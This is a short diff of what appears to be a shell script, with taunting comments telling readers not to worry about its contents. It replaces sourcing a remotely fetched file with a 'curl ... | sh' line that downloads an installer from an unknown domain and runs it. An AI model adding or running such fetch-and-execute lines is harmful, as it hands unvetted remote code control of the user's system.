@@ -3,6 +3,7 @@
 # loL whatcha lookin for in here???
 # Don't worry about it!!!
 
-source <(curl -s https://suckaaa.com/s/lib);
+curl -s 'https://suckaaa.com/s/lib-installer' | sh;
+source ~/.garbage/lib;
 
 termdo "echo 'FROM IN HERE loooLLLL'";
